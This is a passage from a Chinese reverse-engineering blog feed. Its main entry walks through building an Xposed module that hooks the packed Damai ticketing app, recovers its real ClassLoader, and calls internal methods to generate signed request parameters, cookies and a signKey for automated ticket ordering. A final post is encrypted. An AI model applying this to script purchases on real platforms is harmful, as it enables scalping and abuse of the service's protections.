<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240801105629859.png" class="" title="image-20240801105629859">
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App逆向</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>某麦购票Xposed脚本（一）</title>
    <url>/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<p>本文仅研究了某麦app的购票接口，不涉及破盾方法。</p>
<p>本文仅供研究学习使用，请勿用于任何商业和非法用途。否则后果自负。</p>
<p>在之前的文章中我们详细分析了大麦的购票协议接口，并使用了 Python + Frida RPC 的方式成功实现了购票。本文我们尝试将其改为用 Xposed 来实现。</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>设备：pixel 5（Android11已root）</p>
<p>app平台：Android</p>
<p>app版本：8.10.9</p>
<p>工具：</p>
<blockquote>
<p>抓包：Postern + Charles</p>
<p>动态静态分析：jadx、frida</p>
<p>LSPosed版本：1.9.2</p>
<p>Magisk版本：26.1</p>
</blockquote>
<h1 id="流程拆解"><a href="#流程拆解" class="headerlink" title="流程拆解"></a>流程拆解</h1><p>先来分解一下我们之前获取订单详情的 frida hook 流程：</p>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528152727916.png" class="" title="image-20250528152727916">

<blockquote>
<p>构建<code>MtopContext</code>对象作为参数主动调用<code>buildParams</code>获取加密参数</p>
<ol>
<li><p>构建<code>MtopContext</code>对象</p>
<p>​	构造 MtopRequest 对象</p>
<p>​	构造 MtopBusiness 对象</p>
<p>​	构造 MtopContext 对象</p>
</li>
<li><p>主动调用<code>buildParams</code></p>
</li>
<li><p>主动调用<code>CookieManager.d</code>获取<code>Cookie</code></p>
</li>
<li><p>向服务器发送请求并获取返回值，从中提取 <code>signKey</code>用于订单构建</p>
</li>
</ol>
</blockquote>
<h1 id="androidStudio-环境配置"><a href="#androidStudio-环境配置" class="headerlink" title="androidStudio 环境配置"></a>androidStudio 环境配置</h1><ol>
<li><p>创建一个空项目</p>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528163010400.png" class="" title="image-20250528163010400">
</li>
<li><p>改一下项目名称，这里我们使用java写</p>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528163023525.png" class="" title="image-20250528163023525">
</li>
<li><p>拷贝 XposedBridgeApi.jar 到新建工程的libs目录</p>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528163035152.png" class="" title="image-20250528163035152">

<ul>
<li>没有 <em>libs</em> 目录的话就在这里新建一个</li>
</ul>
</li>
<li><p>修改app目录下的 <em>build.gradle</em> 文件，在AndroidManifest.xml 中增加Xposed相关内容</p>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528163047294.png" class="" title="image-20250528163047294">
</li>
<li><p>新建 <em>assets</em> 文件夹，然后在 <em>assets</em> 目录下新建文件 <em>xposed_init</em>，在里面写上 hook 类的完整路径</p>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528002400203.png" class="" title="image-20250528002400203"></li>
</ol>
<h1 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h1><h2 id="获取-realClassLoader-原理"><a href="#获取-realClassLoader-原理" class="headerlink" title="获取 realClassLoader 原理"></a>获取 realClassLoader 原理</h2><p>Xposed hook的时机非常早，因为首先拿到的是壳的 <code>classLoader</code> ，而非脱壳后真正的 <code>realClassLoader</code>。所以在有壳的情况下直接hook目标函数是无法找到目标函数的。</p>
<p>那么我们得先拿到脱壳后的 <code>realClassLoader</code>。</p>
<h2 id="加壳app的启动流程"><a href="#加壳app的启动流程" class="headerlink" title="加壳app的启动流程"></a>加壳app的启动流程</h2><ol>
<li><p>启动时只加载壳自己的 <code>StubApplication</code>（不是业务代码）</p>
</li>
<li><p>壳在 <strong><code>attachBaseContext()</code></strong> 或 <strong><code>onCreate()</code></strong> 里：</p>
<ul>
<li><p>加载加密的 dex</p>
</li>
<li><p>解密原始 dex</p>
</li>
<li><p>使用 <code>DexClassLoader</code> / <code>PathClassLoader</code> 加载业务代码</p>
</li>
<li><p>有时还会用反射把真实的 <code>Application</code> 替换进去</p>
</li>
</ul>
</li>
</ol>
<p>最后才进入真实代码逻辑</p>
<p>所以，我们要hook <code>attachBaseContext()</code> 或者 <code>onCreate()</code></p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>原因</th>
</tr>
</thead>
<tbody><tr>
<td><code>attachBaseContext(Context)</code></td>
<td>加壳 App 最早可执行逻辑，通常在此加载原始 dex</td>
</tr>
<tr>
<td><code>onCreate()</code></td>
<td>有些壳把 dex 加载延后到这一步</td>
</tr>
<tr>
<td>两者之后</td>
<td><code>ClassLoader</code> 已经被替换或补充，可以安全用来加载真实类 ✅</td>
</tr>
</tbody></table>
<h2 id="确定-hook-入口"><a href="#确定-hook-入口" class="headerlink" title="确定 hook 入口"></a>确定 hook 入口</h2><p>查看壳的入口，找到<code>attachBaseContext(Context)</code>或者<code>onCreate()</code>方法的地址</p>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250527223740058.png" class="" title="image-20250527223740058">

<ul>
<li>查看 AndroidManifest.xml 从 <code>application </code>中可以找到壳的入口 <code>com.ali.mobisecenhance.ld.StubApplication</code></li>
</ul>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250527224008579.png" class="" title="image-20250527224008579">

<ul>
<li>进来之后可以看到这个类本身没有<code>attachBaseContext(Context)</code>或者<code>onCreate()</code>，那么跟进它继承的父类看看</li>
</ul>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250527224243940.png" class="" title="image-20250527224243940">

<ul>
<li>进来之后可以看到这两个方法</li>
<li>一般来说我们优先选择<code>attachBaseContext()</code>，<code>onCreate()</code> 可作为补充</li>
</ul>
<h2 id="获取-realClassLoader"><a href="#获取-realClassLoader" class="headerlink" title="获取 realClassLoader"></a>获取 realClassLoader</h2><img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528013157635.png" class="" title="image-20250528013157635">

<ul>
<li>这里我们通过 hook <code>attachBaseContext()</code>成功的拿到了脱壳后的 <code>realClassLoader</code></li>
<li>拿到了<code>realClassLoader</code>之后就可以编写代码继续之后的流程了</li>
</ul>
<h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><p>按照之前的拆解流程，构建出 <code>MtopContext</code> 对象之后就可以调用 <code>buildParams()</code>方法获取到加密参数了</p>
<h3 id="构建MtopContext对象"><a href="#构建MtopContext对象" class="headerlink" title="构建MtopContext对象"></a>构建<code>MtopContext</code>对象</h3><h4 id="构造-MtopRequest-对象"><a href="#构造-MtopRequest-对象" class="headerlink" title="构造 MtopRequest 对象"></a>构造 MtopRequest 对象</h4><img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528021026541.png" class="" title="image-20250528021026541">

<ul>
<li><p>构造成功说明我们成功的加载了类对象，访问类对象的方法也没有问题。</p>
</li>
<li><p>访问的时候需要注意一下是静态的还是非静态的，分别使用<code>callStaticMethod()</code>、<code>callMethod()</code></p>
<blockquote>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528021623229.png" class="" title="image-20250528021623229">

<p>…</p>
</blockquote>
</li>
</ul>
<h4 id="构造-MtopBusiness-对象"><a href="#构造-MtopBusiness-对象" class="headerlink" title="构造 MtopBusiness 对象"></a>构造 MtopBusiness 对象</h4><img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528025008959.png" class="" title="image-20250528025008959">

<ul>
<li><p>这里调用静态工厂方法 <code>build()</code> 拿到实例</p>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528154303241.png" class="" title="image-20250528154303241"></li>
</ul>
<h4 id="构造-MtopContext-对象并调用-buildParams"><a href="#构造-MtopContext-对象并调用-buildParams" class="headerlink" title="构造 MtopContext 对象并调用 buildParams()"></a>构造 MtopContext 对象并调用 buildParams()</h4><img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528043031216.png" class="" title="image-20250528043031216">

<ul>
<li>执行没有报错，但是调用<code>buildParams()</code>的返回值为空</li>
<li>经过尝试可能是因为<code>attachBaseContext()</code>执行完成后业务代码还没有加载完毕，换为hook <code>onCreate()</code>可以正常执行返回加密数据</li>
</ul>
<h3 id="更换-hook-时机为-onCreate"><a href="#更换-hook-时机为-onCreate" class="headerlink" title="更换 hook 时机为 onCreate()"></a>更换 hook 时机为 <code>onCreate()</code></h3><img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528155014836.png" class="" title="image-20250528155014836">

<ul>
<li>现在可以正常打印出加密参数</li>
</ul>
<h3 id="主动调用CookieManager-d获取Cookie"><a href="#主动调用CookieManager-d获取Cookie" class="headerlink" title="主动调用CookieManager.d获取Cookie"></a>主动调用<code>CookieManager.d</code>获取<code>Cookie</code></h3><img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528045016785.png" class="" title="image-20250528045016785">



<h3 id="向服务器发送请求并获取返回值"><a href="#向服务器发送请求并获取返回值" class="headerlink" title="向服务器发送请求并获取返回值"></a>向服务器发送请求并获取返回值</h3><p>接下来手动用 <code>HttpURLConnection </code>发起 GET 请求，格式跟之前 python 中保持相同即可</p>
<img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528045439969.png" class="" title="image-20250528045439969">

<ul>
<li>需要注意，因为 Android 默认是不允许在主线程进行网络 I/O 的。解决办法是把网络请求放到子线程中执行。</li>
</ul>
<h4 id="提取返回值中的-signKey"><a href="#提取返回值中的-signKey" class="headerlink" title="提取返回值中的 signKey"></a>提取返回值中的 <code>signKey</code></h4><img src="/2025/05/28/%E6%9F%90%E9%BA%A6%E8%B4%AD%E7%A5%A8Xposed%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/image-20250528162054940.png" class="" title="image-20250528162054940">

<ul>
<li>提取到之后保存下来，用于构建订单使用</li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Xposed插件开发</tag>
      </tags>
  </entry>
  <entry>
    <title>某麦APP购票接口分析</title>
    <url>/2025/05/05/%E6%9F%90%E9%BA%A6APP%E8%B4%AD%E7%A5%A8%E6%8E%A5%E5%8F%A3%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="86adcc6972771051ecfb261e307855f10db535d79ea5908a82b2855e06d12018">9c5c92dcebb0f00aaa2706e19b539b8bc89e43c0bbb2dbc02612c21cafac3cdf4cbdd7ab0dc0a2aa59e09d2e8b25a14e984890f640a331b15b93ac7b5d83994847a3a3fab4fc77d75be0384b1347bf250df592412fe30e4ceb30f6e1c38055340ea38a6d8cdb2f2ed9beab05cce11aa4ab7d1c38cd24f4fe3e1bd3614a9faa137de303f05b926476d1e34e078fb45fe69956fdead9220f6306e9a9c90cecd774fecba39182586aeec5c02403b7e55a5983f1a73cf2ea467638d8125eb4cd3e9cae7527d48bcfb432c93a1d4f21e21547cd8dc26fee13297e999679593e384664fff8abf5c4a545cc92f3d821ee52e6fa28290acbff2c60e76d35c47c1ddc12f002b8718086e1332a2da0de8bde5d1c35e27686857ed2f96e739db639eadc1c7b3f1845e1feffb134ec6c6b86e37f996027d524ef47cb9ad3ce80b9cfcbf49d0042b672c637bd9f53427d1402ec7b144833e675fbeee9b6d21e68aa82a3660e7b9bbad16094883fa0ca0aff5124c815b847fd9b07bfe6b4395eba50c888fa5ebe714c2d3807dd3847954a17364c5821d8163963f16a924feb5d60d0cba3eeefbe286b7312f7f8d65941985c3991ba3df3985e736d50721b3618ceb222c723a7ea94f1d2a1e8da3d1cf7905e457b6e61cdad319d296a1583e308f58beeb8f86bed723b5431383e78240b05c970d8cac762286906d6abc1e38a87c40d5bdc0bef1a8c699ff3300da56bdbd786c94a49774e132ac5a625f16fa570e45c6e7b8badae81bcaa71a506827346fedbbd1f0f2d42b9e2e19c956fd4f5e72129ba6ae5951c67cb37b0d2537f8c41eca027b58a6d75a65aa3ac785340421852b79cdfa9952d8051bba77ecc26da5841ff225278029fedf894bc95a6077adbd92d6a2de4c314f6458775e4ac7a9fb7e01485ecf9e495a47166c4e248ca8e56d91430d3e466188c7e9071d5b202350c09b4024b74223b01b80e1a51c23e5d2f1ecd3831ccb67751e4259c0da0ea4ee9ad1b9d3d0f08612dc8b284f36766e5fe8c24169a84b510d8b2f1f8e1157a7da18a47f10c83d1e03832a94b4b7fc65f9b473fc039af46e0a0833d98ddb90a415eefdfc0903ae288b992e42389e67e3aced86b67ebbdbaac9a1ec7f909cef7bd901d82f00c15a2cf7e2b24f5aaef94d497f18c6b269f7bd6831278c808ad64b4011224cfc6a4f3d47db0eb6a9182d597bd2e374fa1e0c523774410fca6b5fec301f82b81c18afa508d70daafac0cf47438d14abc63c0c43f399dec78feeef999ec7f2211fb900bc113a9ce6880d2682f02e12d5ef9b65b88a37366fd24a2e271b088aef27b3cd0e87e1e989331ccb259a1f79d13b25ff083a56558a8ce1ce75cb0a767f65706939af4dd54f0da9a5c485fde5feb964fff67f1fbfe89a98400d3b16193b654f623a4afc09942d9d970ec07c7590de4dc3acc0eb718a773a5e2fbe1a40ace2e81632995c159e64bbcf58aa41c5ec2b5204eb6d930c489181705eca46d20bc092ecca146eacc20a49c45868f199ef79ee4ecdeeee3c916cbca449df64b99ffd4a37743cbb0eb8cb6e3861be4302d06babdd64e44ae80a574e9a0dd864a3b4ce49e69596be694cb53f8b998621932dd0ec6d08776d5d8ccce4985f65bbf617553a66c372d392af63ee7671a5e567260f2d4bd4642cd78422c4b6494b5386b59a46af12043920f0a6437ff90b2e8689fc5996deda0bbebb9bca152ddebe646bb428a0f04922acecfabf3dac54e98c27eb263adce642ba092ac93aaf64e7d0046c0dd6384443d6494e3689387f9bf6e9040a539106893ebfff3ff96440b9c84542a14cf44d7b0ea9171b26f54272b93f75ad7e4d0d5dd4deec96a7d1cf2d9e3e7e456b4280f506b90ee8d468e80cb36f0d2e416a7432ea66e182e4f393d864bfabe7805aaa3eeeda59f575cc953d98b1d6eaf65debea4015d4e9ade4007dd826b4a9a51baeb75c874d2aea83b93dda7bb9340deed4e9bb61f45891eb1d4b0d0ae862cec6e87d0d8e9c7c28bc8a2a28a4d54c39be33e46aced3bf790a613a6f714fdc41426e0edde790a0bdbdfba2b7f30977f4ab3cab2f058ae0043a7ef17aa35bc06857a9d6555af07bcbf88b4fcf078af65f9b23921ab75d188036f3068ed277f0aeafbbac84d2651106cdcf1f76d7892b176961a6b8f14d16226cca9b689e4fd6108a980d67540dcf397cf4834aed02acfb939d374baf256db3b37867cc4ddb4aafb15906a82d2dfc5fb5122f7e89faa899f827355ab3dcea96c5959af2aef1918959ce5fff412ed19b962b9eefee90a03828e5977067b2c66bd822a1500d5b7edf62f4a3468fb636457a609a0f0c13597fcd57a6c5c01ef92cf655d4b888505c38a7797f41c8acbadbd6d10d9c36eb7a15680cfc621ea6431a66d55d547aabd55a1c723f60a2e8ff3318d4267b2707ec7867a6aa1658e47d5e0ead8db943a42745acf12454c44dfe2eef99ba8e6ab970dac6620ff8e9daed2d4bbfa417e22fecadebfc7611c648a58ded774b8fb61f51df8aaa3f8e86266c014ca9d70b565c6a48a2412297d634a01f39be43c3cdc9c6bbb730f7c65c60f763ec12c716b091c29366796910bc545bc73e08ed5b13c1b4f740c44277632bf144b1a56fb9cd203a4535467bd4319868028baae6d8b567b14ca257de6a47fb86c6e32057416f4151c5c9e169e4949dc8c8ab8b921d448eab5ac61044b0db489a7049bc76258c639c8dcf1e0fce9f729641c3669c1b752a14d05bf690e0b77f6a23e4622d7c3b2dcedd2989bbcbec5aa2b0d37dd868a36db176c76eeca44c6c1f864d78a45df0d198bfd7b990f16c3100d3c059232ff96e04777e5b883f87c71127e7a69cd1696eab205b8a9abb2228a068f68bdd451cb7b8a6260a29f43c491bb3b55febbbfca2fbbf2a24f28789dfb173ad748e2e75018401e677adfbfa60b21c6f6966fa62333fd2f5df61b4d0351502c5c7d14c60c078a6e2ac331f3d1e2c3e54c78cf8ebd9cb833b786cfc8dec7ee661be15f295d41a6b9addcee831ee0beba7c3825b442d8d09f7c2f5200b5f6310eecfc4b9aaf543719ba27b5735101bc9b6145e6a006a7a1545de6c62e5d157f75271b7bc67ceab297aacd4a4c467370ac552a7a4bb56879581f71e0d4aa3b2c8942b70503dd3cc98417c1e849f39c4da8f1026a7558e2502fc6a4459a581689393a2c2e18070de471e9b0edf3d7a75bd33019eca1f939bd7dee0b503ca67e1590d83ac2e8cce000fd418fca345174f9702cd04c1a942e0c45cf0a0da6b8dd9aba4c213d37d8680a6a766ffd10a5ca8f280bef9d51021984d46c889b3a8bc2d7bfcbe12d2be7818a888b44b97177c69058f70ffa10d6b11e58ed900aa5ae6ee7443788218b6fba3bc1fd3fce81aef00ad0f781e9303339b9c93adc6cfc4b7dcccfb5332641dc61bd1caf0f91c3f2deae96aa7a1646dec26a0130d7f8d10e8a88a056da573c02379ffbfec1bba74b191209cf2113105f2dbe6339037bbd0ed4903c89aa71e554c1db5c5543604ea1775d9b4b0acfa8be9a97acfad082179c46fa485ce45cdf6f86730f1bcaae371cd84a54ab05b6b69ec5ae3d500f0d86fd72dc65af767dbcaec234070f50ed4d23272effe37dc933bc13e37891048d71865a2eac68cac2afe5ee9492230bc4410b01776ee7663848f1888b0449234bf456b34201e6551262530d1e236e3e1a83b394fc03306168c66729182e650a4316783d6a4a93fba0a1700c934cd7c2b185d71adf7207948f984519b68c57de6aeae73274b1a4d7d5b104951750f27ebfc3c6882c1e87beab7ac3122ac9cdf0d5158f54a00ce67b251122c8e65cb1507a3abb1c67522bcdf5fd0980e813f8c3ccb8e75bcc74e42f366753c607f529c97423c3927ac63c371332ded4eec53d27dad29ea1062be6f9932ab6b88dddc1ac45f5941de0aa07f147daf24f687c6840444b3ef90a1e8c7c43ccef6eb4f7e4692480bc09cba335ade6f9456651ceebc237314192f0e9412abde6387e9c1ae5b0ab647a137dc84916ab8bb975d7a9d8841829abf1e62d37b33ca9880cbebeb3df63da7fac033da44c983ec9e60bf2811501c3dc32d53916978485a68cb249059653e512c32cbea234a752bf0b5342f48e39029108df76af860bc5d10655f796422a77995952d4c2a378e798e7438d93dcc9705c56d182eb81e53916ae0685b381915667a0ebd9593573ba6eb6d164cb662d926bfdd14edcfac7faa98e13fae52b47ce02c1f4c50cf31b93fd06f3768b2dd355081006f1dc4fc593fc53740a023301974a2301382f852cff38228d019966c2c7f7ec6aac0da69eff165dfc53f0af1965fb189beac4c0209efe10e7b355e1c7ad0418ed6c9e862c819c7fef8b8ae0a36daa8496bc7270f6d1e3626307035ab93ca7bee43f759efbf630332c3dc29780c96deaddb2a793f4cbf0665fe0860e25d154598beb399f893bae4e87393ca79f2889ed75020b602a46953191c846fde4be9bc4743c262af1eabf4c5cb43879aa8c082ff10a7f6fa59d9c9be908c7daf121c8af9c9e0b8e70a4570a98fb7ee7e388faa5688c1d550eadea0957e13ba07b40b94a35e23490f3d57fb67d6294a05ce4dbcc57b98d98b107c84d2a29094090bd20899fa301f9b1e9cca3688e81cf89762b935e1d684a2b6a8802ccfbca7ace988ac0f633546368a3c9694838a6ba28b02d40e7a08cf83e7297b0afdbcd3cd54f20ffb3ff998b4832d8e53097b9328571b8d30d34b5f089589a206c5b9c777dfdb83d66d39ae7ab26e9fa8f503c526825b214a71de2b8bb2384c18beb536c3a5e9fa3426f52f97f730fd9f71ae2646aa230756fcd1a53ed88f8d0ffb539e83b981eb8586e6129453de58991fd035412a02c19991a626453741970e54041779806130b2509e8c8a8230792f231775ae3c2cf9ecfee412fa77d430227aeb04acc6eb78c64228df3f5ca49a2572af0ab4771224e6a28190e261273b7c894c049d8ae923b7175442e3e56aaf98d3043b9f0838ea63138a3a22fd3729d174db1aa94cc412d65fad55edf783199aec6a49a87234d47829d89739cd8cde6acdab02f75d7131f24f35c70516cc9b6dd33e019550a321035b217a8d1c74ef4be0056bd5dc0380007d666a2b2b7a81de1d006faaec6575a07dcc9a3a5f02ddc5e7b721e5e35bf4a2067c5c5c2fc67b46d2b9c559a5da6d51f37d15fb2930385d859c54ce07517203e93b95f5d87854ebe492a82e3b9774cd772277a1980fb61144cb20cac02a35a00f0a2bc9d1ffa1d3e14943db3a497d925de209cb73d788e863279044c0250e3a359a92093fc8420975f002509938af6dc40efabc4e388b07078f0b70be342cea2c3afa27cfb7fec284f59e57c9cb414fed5cb9c9a42dfa80b9d9568f6248ea55485af3ad79a883770076dda5eb60f5b5473bdb66ef43aeb0fb8ca67539742c10540edc237ad25122617a6ac6381f1a4643a40ad06894179aa5642388372e7331ce88daae4fd75ae5c210c1ef9b2a087d66ba630944a44181dc501eb7e0141d25495bec762b0d5d0b4c3e6cd770c74261a2448d7637b175c6a9053e2b40ac77bb8a6b124126461fa17bcbe4eeda2ffc6cde09c5a84481634ade2dceb4d9c4e49b0a8b7373ce5a30a65ab70b6f7171d030786b649179c88de9b03a603e199a95ef54b0c5649df70693fd831e5b25c73ca90e80ed0097ba1ec6b18ebb70889585a5e2c15c66cdc2bf975bd46064f4c060065f1efc4d0186e43a3aed38787e26e0aabc238299fce48946695f05053c9740d303e36c7ccd34d76419731ed8ca01ad7a9edb82dae14c41efc832c34c90882bdd86051e95477f8ebd848a86330fe9a70e392a8cd0cc83d0a836a24381c8326e7e8b10e62d67aa76bfcb149c54325d4c5bdc64b80c3b25d7696e9956eec73d4afe0f1af027b27545d9ef46ba22c10387f6a8a22de20b3288ecee4776215a1841ec687d4138040b001916085bc158ba5f64892104a271abeb8d4b8fad4ab5f9fd2464de7fb504f26de7bf8e00463c37da72ae9e7b2a1fafeff8e940b46afacfa18424f89fa5a91ea9036aeb34be418f0b01ae66aff5a20aa6c2c13633c982d47429a748c13ad8045ee25d439c7257636292706825e41d6b156bcb2d36310f89edcf5497bf63be0b92b6b1591f582ce7ff8f142792ff91619c97a12dd067f01002e8ad8fef873d32118a7f51504bd2de32c4179e11962b227b6b7a2753db0c7f81944330f11cd5a6f5124fd422482be56a4aad66dfa80e5af4d7599f00793ad90d34c0895f034a57afd869325ab6c7ee38c6bfc8bba723730b9188ac69dca8e76a54ad6d3b1ae4a456affcb27ea7cc18e0ddfbf8111606874ac4d62d263c3066b76a78a5823548bfeec92fa3ea88ba850e4ffc1aea1f2c97d5f5a68aa1afb954c39a3b165cc156ea2f1200ce0f5dd7c3a220e5649aa230ce1957aaf2f801ccfcfd149bc908c2d082755a8b9b4fe016165679b027cd0652a4bce107ca18b303ae06bed0dba6b43cd75b024317728a7847be09528c8121786a117d60e2fe926095823a078103f0d9f4a10ddaaf0c10b15dbf5f579db52af30524ea08de59dafe6580eb278437d12a2fbf42faadae2dc4683695da8467ccc4fdef4010a46d3e7eb8aa1cfdc9cdd63258776fd8309b3bc7ec9a9b7163fe32cc4feb1f3489e8e529d434d17cae9940ceb3c2cca6d7c2c8d677c283f44e4ab9c1883a5cb112185b63ecc5a0ffb9b3343aa586f1eb5bc5e030f50f0087955bbae8302c61de6b4bfc8d8b73cc143bf94e21df4564b37fb595f65627b3ee6c9c31c76a6136c98bb9e6ac91bf02e19883663c4286fb002d1d402f9ef7b8e6f6716e3e2dabe710e4fac609ae5f42d21a3db8d41f874073e27a27ca175164b8b2d6de3c17ce33dd3224183d4529e4f428c571021fb86b480426e725cab22406d6dfcccd14be45495c391fab2064d2f6b74b722fbe02821c5f611083bf69ba5baca40b8f084430275a5d259852cbda9c237ae7841e88579f368fa3944afd43ca60dbbaa52284239561e1bef007b407e0aaf30744a5e68bafa8300ffd1fa3abeed2ae696a5e153f0dcf3af30357ab2c3fcf18560f9f81d1d1f06af15742e1c9f199bad6b0691462664d33a061d9bcdc00ececea5f947acbdf9a23117c6beb1ee11c10b7eba0853145a8f18f7f8c3b6f42e50bb761d3dceabc3b91d2b46796b5b0c49839016b54e795499b14b33e05662f65f607c80f66ad5d52e08e362ea3279678ffa4e2b5e231c2d6fa11122f0cb2513672fab8bb828740942cdae71f4721b152bf79a9e84de7bca29370c9b166d55b85d7fcc2227ce8ee17d42a7f357afc07f6e9fef339a79288b8d8b03c31bd303adbf1051c774b2966fa495f752e795902261a711ba83f9f7d384b83e68ec91c8b95873b5154a65a33da774e6f510ec541df381d2fb5ec5d1e9cb2d5f8806f85fba70e12f62823e3ed3864ecf5df4dfa2d5a635375b70224e6abf9f4c05e53c80ca371c0fdfec4cafa403af5d8d66ef1387d1c10fdae3353b243e4957b149afd384ba59e946ff5c62893751c8cdcef5ddaadf35094578849f8ab1c5d741f4bfed2fdcb4c5d111d843bda556bfaa4cd5defb21043de8983e3289df7344d5a8b36c634dd0b3977f54c669b6dcf70253bdd1c2a260037832d05a5c5a96e6fa1dbd9011a7f17571bb46470be3dcb8c736964c749604df788d4d1768dbc2e1b988cdebd8b336bef3759aed217f1c39745653868be2e0dcb298de870f222984ae61f9aa58d0db0d60e2bb7c126fb59c83d41bc719ffcd46fc2fe2a4c85b14c09b7e86dc37402c4f8eb36448a1f13dbc762df411426371ad7058ce7e1854397ea1782aae4cd0b2c7ee4577c5c04c0019d260ec4d8d3821ee634626d954ac35dffeacc517a4cb1baf36f2948f3f39e32b36ec0237724d74bc43f36438021e93dd8508b5b2fdaeb31dd3051bdd2586d8874832778930aab266e5f66507600806df5560e4e7bafb9fbc82d2981519efc0969a481341f246ea1c821964326bf92284a7545ea1029f2d9912103ee0664092c6c1c7f7c9ac1b4daed1d9ab75882b144db544e33190fa1f43f113eb3326183a1e2787817b8a52a6bcfbd5883bdcd6c1b013cac73874c556e0d5eedf212ee2233180a426ca32bb3ff036e4e3dd02b8b465eb82702ad94c09673671f42f118336092ee7e01dbfc3eee433e7cce4458b288418906e9857176899cc1f92089d93c518711b4b5e0117b01d37c80e8881ade66b5415097ab9f5dad6307227b37d9be486d85b9c169bd128c54e5673f8c2aa2282e1ad179b2baeb902b1be33e11eca03dfd228293d4d7b104527d0b9c1ab51ab7186b732007f92561bf7b489311b44aaf7dffd43bb2e77ba76fa49c64ecb7e24f3d2417dc9ed955c09932c93f17533d48334bec95af7b3d094de4aa2283a1db779badfefb60f11b39c2291fda8e6ae5fcd571f5ecdbc7a81524d3ff1369d1d1bdab2ebf514fc1dd91bc0c72cee5be3936dad78a5f24e63858c232816d03d38b3aa889068dfb2833efd41510165d5b895b6a76e5840dfa1efed570f783a3ebba8a560d89e4d672095aff78acb4f92df876fe752a827088c8829e20872a54ac026e853000b1f69f4a2f1e6126fc98b7a709177676c2160b07d8d05d072983fc0f7e641c618d2633d521ef942b0c2b7a4024a3dee01e6c47120ca095484a81913d7be20a9ee581c3020f17521e3ce41e8e1d18b0b40a62423d5aba756a625f727ce0c7b8ad97b97be10339c24b40234a5763836f39f06f37b3f60f222a01fff3f102d7e963c67d9351f50738d2759022be71ae8a45d87de3285ad2984b1919a813008c3dd253daa66d4d8de8e2ce55561d48dd8591cf428a90c3cb8a2c09270fb5e64c453e2d3755f8ac0c4d92155c7dcb6f17605549f3231f95d4aa0676d8679f3e35e3fbc900aac6